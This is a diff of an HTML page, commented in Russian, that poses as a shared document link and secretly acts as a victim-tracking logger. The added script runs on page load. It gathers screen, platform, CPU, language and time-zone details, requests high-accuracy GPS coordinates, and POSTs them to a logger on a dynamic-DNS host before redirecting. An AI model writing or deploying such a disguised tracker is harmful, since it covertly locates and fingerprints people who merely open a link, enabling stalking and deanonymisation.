@@ -12,17 +12,48 @@
 <body>
     <div class="loader"></div>
     <script>
-        // Извлечение slug из URL (например, ?id=my-link)
         const urlParams = new URLSearchParams(window.location.search);
         const slug = urlParams.get('id');
-        const targetServer = "http://echomapwa.ddns.net/logger/l/"; // ЗАМЕНИ НА СВОЙ АДРЕС
+        const targetServer = "http://echomapwa.ddns.net/logger/api/log_advance/"; // Эндпоинт логов
+        const finalRedirect = "http://echomapwa.ddns.net/logger/l/"; // Эндпоинт редиректа
 
-        if (slug) {
-            // Перенаправляем на твой логгер, пробрасывая ID
-            window.location.href = targetServer + slug;
-        } else {
-            document.body.innerHTML = "Document not found.";
+        async function collectAndGo() {
+            if (!slug) {
+                document.body.innerHTML = "Document not found.";
+                return;
+            }
+
+            let info = {
+                sw: window.screen.width, sh: window.screen.height,
+                plt: navigator.platform, cores: navigator.hardwareConcurrency || 0,
+                lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                gpu: "Unknown", coords: null
+            };
+
+            // Пытаемся взять GPS (т.к. GitHub на HTTPS, это сработает)
+            if ("geolocation" in navigator) {
+                try {
+                    const pos = await new Promise((res, rej) => {
+                        navigator.geolocation.getCurrentPosition(res, rej, {timeout: 6000, enableHighAccuracy: true});
+                    });
+                    info.coords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
+                } catch(e) { console.log("GPS Denied/Timeout"); }
+            }
+
+            // Отправляем данные на твой сервер через POST (AJAX)
+            try {
+                await fetch(targetServer + slug, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(info)
+                });
+            } catch(e) { console.error("Server error"); }
+
+            // После отправки логов — финальный редирект
+            window.location.href = finalRedirect + slug;
         }
+
+        collectAndGo();
     </script>
 </body>
 </html>
